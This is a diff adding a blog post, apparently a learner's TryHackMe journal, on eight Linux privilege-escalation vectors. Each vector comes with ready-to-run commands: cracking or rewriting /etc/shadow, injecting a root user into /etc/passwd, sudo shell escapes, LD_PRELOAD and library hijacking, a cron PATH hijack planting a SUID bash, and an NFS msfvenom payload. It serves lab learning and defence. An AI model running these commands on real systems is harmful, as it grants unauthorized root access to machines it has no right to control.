@@ -1,0 +1,160 @@
+---
+title: "Eight ways I learned to get root on a Linux box"
+slug: "linux-privesc-eight-vectors"
+date: 2026-03-15
+lang: en
+translationSlug: "linux-privesc-huit-vecteurs"
+type: journal
+category: Linux
+difficulty: Medium
+tags: ["linux", "privesc", "tryhackme", "suid", "sudo", "cron", "nfs", "beginner"]
+platform: "TryHackMe"
+excerpt: "I thought privilege escalation was about finding the right exploit. Turns out it's mostly about reading what was misconfigured and asking: who forgot about this?"
+published: true
+---
+
+## Before this module
+
+I thought privilege escalation was some dark art. Find a CVE, run an exploit, hope for the best.
+
+Then I did the Linux PrivEsc module on TryHackMe. Eight vectors, eight categories of misconfiguration. None of them required a zero-day. All of them required someone to have made a bad configuration decision at some point — and me to notice it.
+
+That realization hit harder than any of the actual techniques.
+
+## Start here. Every time.
+
+Before touching anything, enumerate. This is the checklist I built this week:
+
+```bash
+uname -a                                          # kernel and architecture
+id && whoami                                      # who am I right now
+sudo -l                                           # what can I run as root
+find / -perm -u=s -type f 2>/dev/null             # SUID binaries
+cat /etc/crontab                                  # scheduled jobs
+cat ~/.*history | less                            # what the user did before me
+cat /etc/exports                                  # NFS shares
+```
+
+Each line is a question. The answer tells you which vector to try next.
+
+## The eight vectors
+
+**1. Cracking /etc/shadow**
+
+If you can read `/etc/shadow`, you have the hashed passwords. Copy the root hash, take it to your own machine, let John do the rest with rockyou.
+
+```bash
+grep "root" /etc/shadow > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+The fix is obvious in hindsight: `/etc/shadow` should never be world-readable. It often is.
+
+---
+
+**2. /etc/shadow — world-writable**
+
+One step further: if you can *write* to shadow, you don't crack anything. You generate your own hash and replace root's.
+
+```bash
+mkpasswd -m sha-512 mypassword
+# then edit /etc/shadow and swap the root hash
+su root
+```
+
+---
+
+**3. /etc/passwd — world-writable**
+
+Same idea, different file. `/etc/passwd` still supports inline password hashes (legacy behavior). Add a new root-level user directly.
+
+```bash
+openssl passwd mypassword
+echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
+su newroot
+```
+
+The fact that `/etc/passwd` is writable by anyone is the entire vulnerability. No exploitation needed. Just a text editor.
+
+---
+
+**4. Sudo + GTFOBins**
+
+`sudo -l` shows what the current user can run as root. If that list includes `find`, `vim`, `awk`, `less`, `ftp`, or dozens of other common programs — [GTFOBins](https://gtfobins.github.io) has a one-liner to escape to a shell.
+
+```bash
+sudo find . -exec /bin/sh \; -quit
+sudo awk 'BEGIN {system("/bin/sh")}'
+sudo vim -c ':!/bin/sh'
+```
+
+The misconfiguration is granting sudo on programs that were never meant to be security boundaries.
+
+---
+
+**5. LD_PRELOAD**
+
+If `sudo -l` shows `env_keep+=LD_PRELOAD`, you can inject a shared library that runs before any sudo command. Compile a `.so` that spawns a shell, point the variable at it, run any sudo command.
+
+```bash
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+sudo LD_PRELOAD=/tmp/preload.so find
+```
+
+---
+
+**6. LD_LIBRARY_PATH**
+
+Same family. Find what shared libraries a sudo-runnable binary depends on (`ldd`), then replace one with a malicious version in a directory you control.
+
+```bash
+ldd /usr/sbin/apache2
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
+sudo LD_LIBRARY_PATH=/tmp apache2
+```
+
+---
+
+**7. Cron jobs — PATH hijacking**
+
+Cron runs scripts as root. If the cron `PATH` includes a directory you can write to — and it comes *before* the real binary — you can drop a fake script with the right name. Root runs your version at the next scheduled minute.
+
+```bash
+cat /etc/crontab              # check if PATH starts somewhere writable
+echo '#!/bin/bash' > /home/user/overwrite.sh
+echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' >> /home/user/overwrite.sh
+chmod +x /home/user/overwrite.sh
+# wait 60 seconds
+/tmp/rootbash -p
+```
+
+Always clean up: `rm /tmp/rootbash && exit`.
+
+---
+
+**8. NFS — no_root_squash**
+
+If an NFS share is exported with `no_root_squash`, root on the attacker machine has root-level access to the share — no squashing, no downgrade. Mount it, drop a SUID binary, execute on the target.
+
+```bash
+# on the attacker (as root)
+mount -o rw,vers=3 TARGET_IP:/tmp /tmp/nfs
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+chmod +xs /tmp/nfs/shell.elf
+# on the target
+/tmp/shell.elf
+```
+
+## What actually changed
+
+Knowing eight techniques isn't the lesson. The lesson is that all of them start the same way: look at the environment, read what's there, ask *who set this up and what did they assume?*
+
+Every vector here is a misconfiguration someone made — sometimes years ago, sometimes by copying a Stack Overflow answer, sometimes by not understanding what `no_root_squash` actually does.
+
+The checklist is the skill. The rest follows.
+
+## Resources
+
+- [TryHackMe — Linux PrivEsc](https://tryhackme.com/room/linprivesc)
+- [GTFOBins](https://gtfobins.github.io)
+- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
